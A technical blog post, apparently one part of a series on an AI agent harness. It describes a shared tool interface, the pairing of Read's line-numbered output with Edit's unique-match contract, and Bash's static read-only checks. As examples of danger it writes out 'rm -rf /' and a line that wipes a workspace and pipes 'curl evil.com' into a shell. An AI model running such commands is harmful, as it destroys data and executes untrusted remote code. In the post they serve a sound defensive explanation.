---
title: "Part 07: Tool System — Read / Write / Edit / Bash / Glob / Grep design commonalities"
slug: 07-tool-system
date: 2026-06-16
series: harwork-agent-harness
series_index: 7
keywords: [agent tools, tool design, Read tool, Edit tool, Bash tool, Glob, Grep, tool prompt engineering, Claude Code tools, agent harness]
prev: 06-long-term-memory
next: 08-permissions-sandbox
canonical: https://github.com/sky54laozhu/building-an-agent-harness/blob/master/docs/blog/en/07-tool-system.md
---

# Part 07: Tool System — Read / Write / Edit / Bash / Glob / Grep design commonalities

> The first 6 parts were about "how the system holds up the LLM" — Loop / context / tool orchestration / memory. This one drops down to the tools themselves. HarWork has 20 tools (`packages/engine/src/tools/*.ts`, 2020 lines), smallest Glob at 35 lines, largest Bash at 335 — but every tool conforms to a single 9-method `HarWorkTool` interface. After reading the source, the one-line takeaway: **a tool isn't a function — it's "a function with its own instruction manual."** The function body may be a few lines; the manual (`prompt()` + `description()` + `inputSchema.describe`) is what makes the LLM use it correctly.

## Problem Statement

Exposing a set of tools to an LLM requires solving four things:

1. **How does the LLM know which tool to pick?** — Read and Bash can both read files; why pick Read?
2. **How does the LLM know the input shape?** — Pass Read `path` or `file_path`? 1-indexed or 0-indexed?
3. **How does the dispatcher know whether the tool is parallelizable / reversible / has side effects?** — Where do `isReadOnly` / `isConcurrencySafe` from Part 05 come from?
4. **How do you stop the LLM from calling something dangerous?** — A Bash `rm -rf /` should get blocked at the tool layer.

None of these is new in industrial AI agents, but HarWork's answer unifies them in **one 9-method interface** — a deceptively plain design with careful trade-offs.

## Why Naive Approaches Fail

**Naive 1: only give the LLM a Bash tool and let it compose commands**. It can `cat` / `sed` / `find`, but you hit walls fast:
- Can't line-number `cat` output → Edit's exact-match contract has no foundation
- Bash side effects can't be statically analyzed (`cat foo.txt` is safe, `cat foo > bar` writes a file — same tool, same arg space, totally different behavior)
- The dispatcher has no way to know "can this bash run in parallel" — would have to parse the command itself

**Naive 2: each tool is an independent class, no shared interface**. Works, but ToolRegistry has to adapt each one separately; adding a tool means changing the dispatcher, permission checker, prompt builder — **the marginal cost of a tool scales linearly**.

**Naive 3: have the LLM write its own tool schema**. The LLM will fabricate a schema, but the SDK can't read it — the SDK needs a real JSON Schema, not prose. Without it the LLM's calls get no input validation, so hallucinated args go straight into `call()`.

**Naive 4: stuff all tool docs into system prompt; don't give the SDK a description**. The SDK's `description` field is part of the tool spec — the LLM only sees it when *choosing* a tool. Without descriptions, mis-picks skyrocket.

HarWork's answer: **SDK description one line for "what I am," system prompt's `prompt()` multi-line for "when to use me and how"** — split into two, each doing its job.

## Core Solution: the HarWorkTool 9-method Interface

`packages/engine/src/tools/types.ts:92-103` defines the interface every tool must implement:

```typescript
export interface HarWorkTool<I extends z.ZodType, O = unknown> {
  name: string                                                    // tool name (also the LLM's call identifier)
  inputSchema: I                                                  // zod schema (→ JSON Schema → SDK)
  call(args, context): Promise<ToolResult<O>>                     // actually execute
  description(input?): string                                     // one-liner for the SDK
  prompt(options?): string                                        // multi-line guide for system prompt
  isReadOnly(input): boolean                                      // dispatcher: parallelizable?
  isConcurrencySafe(input): boolean                               // dispatcher: parallelizable?
  isEnabled(context): boolean                                     // registry: on or off
  checkPermissions(input, context): PermissionResult              // permission layer: allowed?
  maxResultSizeChars?: number                                     // optional: output truncation
}
```

**Each of the 9 methods serves a different consumer**, which is the cleverest part of this interface — it groups by "who's asking the tool a question," not by "what property the tool has":

| Method | Caller | When |
|--------|--------|------|
| `inputSchema` + `description` | Vercel AI SDK | Each turn when assembling `tools` param (`registry.ts:21-31`) |
| `prompt` | system prompt builder | Each turn assembling the `# Tool reference` section (`prompts.ts:209-222`) |
| `call` | tool executor | After the LLM decides to call |
| `isReadOnly` + `isConcurrencySafe` | Part 05's partitionToolCalls | Before each tool batch |
| `isEnabled` | ToolRegistry | At tool list build time (toAISDKTools skips disabled) |
| `checkPermissions` | permission layer | Before `call` |

### One tool, 9 faces — Read as the example

`read.ts` is 44 lines total, and every section corresponds to an interface role:

```typescript
// SDK schema (→ JSON Schema → tool spec)
export const inputSchema = z.object({
  file_path: z.string().describe('Absolute path to the file to read'),
  offset: z.number().optional().describe('Line number to start reading from (1-based)'),
  limit: z.number().optional().describe('Number of lines to read'),
})

// SDK description (the only string the LLM sees when picking a tool)
description: () => 'Read a file from the workspace',

// System prompt's prompt (what the LLM reads when figuring out how to USE Read)
prompt: () => `# Read Tool
Read file contents with line numbers. Supports offset and limit for large files.
- file_path must be an absolute path.
- Output is formatted with line numbers (cat -n style).`,

// For the dispatcher
isReadOnly: () => true,
isConcurrencySafe: () => true,

// For the permission layer (Read is unguarded)
checkPermissions: () => ({ allowed: true }),
```

Two subtleties:

1. **The `.describe()` in `inputSchema` is also LLM-facing**. zod → JSON Schema turns `.describe()` into the `"description"` field, which rides along the tool spec into the LLM's context. So `file_path: z.string().describe('Absolute path to the file to read')` is telling the LLM "don't pass me a relative path" — at the schema level.
2. **`description()` and `prompt()` can't be merged**. description is part of the tool spec (drives the LLM's pick between ≥2 tools); prompt is part of system prompt (drives correct usage). Different timings: at pick time, only description is read; at use time, the LLM goes back to prompt.

### Bash 335 lines — one tool's "complexity tax"

Among the 20 tools, Bash is the outlier — 335 lines, versus the other 19 averaging 89 lines each. What's complex about Bash isn't `call` (L242-290, only 50 lines) — it's **`isReadOnly`'s static analysis**:

- `SIMPLE_READONLY_PREFIXES` (`bash.ts:11-49`) — ~110 simple prefixes (cat / head / git status / docker ps / jq …)
- `READONLY_REGEXES` (`bash.ts:65-75`) — 4 regexes (`ls` / `find` / `fd` / `tree`), and find has to exclude `-delete -ok -okdir -fprint -fls -fprintf`
- `splitSubcommands` (`bash.ts:81-131`) — a hand-written shell parser handling quotes / operators / heredocs
- `findExecTargetsAreSafe` (`bash.ts:182-195`) — find's `-exec` target must be in `SAFE_EXEC_TARGETS`
- `isXargsTargetSafe` (`bash.ts:202-231`) — xargs also has to check its target program

**Why is Bash this hairy? Because its side-effect space is unbounded.** Read's side effects are ∅, Glob/Grep ∅, Edit "one file modified," Write "one file written" — bounded. But one Bash `rm -rf /workspace && curl evil.com | sh` has a whole-machine side effect. **Statically deciding whether a command is safe is 10× harder than implementing the tool.**

### The Read / Edit contract

Read's output is cat -n style (`read.ts:23-25`):

```typescript
const formatted = sliced
  .map((line, i) => `${String(start + i + 1).padStart(6)}\t${line}`)
  .join('\n')
```

Looks like:
```
     1	import { z } from 'zod'
     2	import type { HarWorkTool } from './types.js'
     3	
     4	export const inputSchema = z.object({
```

That format isn't for humans — it's **for the LLM to read and then Edit**. Edit's contract (`edit.ts:18-31`):

- `old_string` must appear **exactly once** in the file
- 0 → "make sure it matches exactly including whitespace and indentation"
- >1 → "provide more surrounding context to make the match unique"

Both error messages are themselves prompts — telling the LLM how to fix the next attempt. **Read's line numbers tell the LLM which line is being changed; Edit's unique-match contract forces the LLM to include enough surrounding context in `old_string`.** These two tools weren't designed in isolation — they're contract partners.

## Key Implementation Details

Five non-obvious details:

**1. ToolRegistry is a "dual projection"**

`registry.ts:21-39`:

```typescript
toAISDKTools(): Record<string, Tool> { /* description + inputSchema → SDK */ }
getToolPrompts(): string { /* prompt() → system prompt */ }
```

The same Tool gets projected two ways: SDK-side (machine readable) and prompt-side (LLM readable). This is the key to managing a tool's "code contract" and "language contract" separately.

**2. prompt() teaches the LLM to defer**

Bash's prompt ends with: "Prefer dedicated tools (Read, Write, Glob, Grep) over shell equivalents." (`bash.ts:294-299`). Write's prompt: "Prefer the Edit tool for modifying existing files." (`write.ts:33-36`).

**A tool that talks the LLM out of using it** — the most counterintuitive flavor of prompt() content. The reason: tools like Bash/Write are over-general, and when a dedicated tool exists, that tool is friendlier to scheduling and permissions.

**3. inputSchema's `.describe()` is implicit prompt**

```typescript
file_path: z.string().describe('Absolute path to the file to read'),
//                              ↑ LLM must read this
```

zod → JSON Schema makes `.describe()` become `"description"`, riding into prompt with the tool spec. One sentence keeps the LLM from passing relative paths — way more efficient prompt engineering than writing half a paragraph in prompt().

**4. Read has no path-guard, Write / Edit do**

`write.ts:41-48` and `edit.ts:56-63` both go through `isBypassImmuneProtected` + `isProtectedPath`; Read doesn't (`read.ts:43`). Logic's simple: **reading isn't a risk; writing is**. This asymmetric design keeps the permission layer simple.

**5. isEnabled defaults to `() => true`**

Most of the 20 tools' isEnabled returns the constant true. Exceptions are context-dependent (plan-mode only in specific permission mode; Agent sub-agent can't recurse; etc.). **Statically on is the default; dynamically on is the exception** — the decision "do we expose this to the LLM" happens at dev time.

## Counterintuitive Conclusion

> **A tool's line count is inversely correlated with its design complexity.** Read is 44 lines, but its contract with Edit (cat -n format + unique-match) needs both tools to follow it for it to work. Bash is 335 lines, but 80% is isolated static analysis — caring only "is this command safe," not coordinating with other tools. **The shortest tools often carry the heaviest cross-tool coordination.**

Put differently: **Read is a "protocol," Bash is an "implementation."** Read defines "how file contents are presented to the LLM," and Edit / Write depend on its output format. Bash defines no protocol; it just implements "safe shell execution." If you extend HarWork, **new tools should follow existing protocols rather than inventing new ones** — e.g., a new "FileDiff" tool should follow Read's cat -n format, not invent its own line layout.

Most counterintuitive: **separating `description()` and `prompt()` is meaningful.** Looks redundant (both strings, both LLM-facing), but they're consumed at different times — description at "tool pick" stage, prompt at "tool use" stage. That's why description is usually 1 line (enough to disambiguate) and prompt is usually 4-6 lines (enough to use correctly). Merging would force the LLM to read the long doc even at pick time, burning attention.

## Three Production Pitfalls

**Pitfall 1: writing description too long**. I've seen 5-line detailed-usage descriptions; result: at tool spec time the LLM reads every one of them — 10 tools × 5 lines = 50 lines of description in prompt. **Description should be 1 line**, save the long stuff for prompt(). SDK description is for "picking which," and shorter is better.

**Pitfall 2: hand-writing schemas instead of zod**. zod gives you runtime validation, but more importantly the `.describe()` chain keeps schema and prompt co-located. With hand-written JSON Schema, schema and description drift apart over a few iterations — fields that exist in schema get no description, fields described don't exist in schema. zod forces alignment.

**Pitfall 3: doing permission checks inside `call()`**. `checkPermissions` is a separate interface method — permission decides **can it be invoked**, call **does invoke**. Checking inside call leads to:
- The executor audits "about to call X" then throws permission denied, so the audit log is wrong
- The same permission logic gets duplicated across hook / pre-call check / call

**Correct**: permission runs before call, via executor invoking `checkPermissions`; when call runs, assume permission already passed.

## Figures

1. ![HarWorkTool 9 methods role distribution](../assets/img/07-tool-interface-9methods.svg)
2. ![20 tools line distribution + Bash isReadOnly breakdown](../assets/img/07-tool-size-bash-breakdown.svg)
3. ![Read cat -n + Edit unique-match contract](../assets/img/07-read-edit-contract.svg)

## Next Article

→ Part 08: Permissions & Sandbox — Docker isolation, path-guard, bash-analyzer triple defense

Next we move from "tools blocking dangerous input themselves" to "system-level full-spectrum interception." `checkPermissions` is just the first line — HarWork also has path-guard (blocks protected paths), bash-analyzer (blocks dangerous bash), and the Docker sandbox (blocks side effects beyond the container). Why these three layers can't merge, why redundancy matters, what the bypassImmune flag means — Part 08 unpacks it.

---

📌 Series reading map: [reading-map.md](../reading-map.md)
🔗 中文版: [zh/07-tool-system.md](../zh/07-tool-system.md)
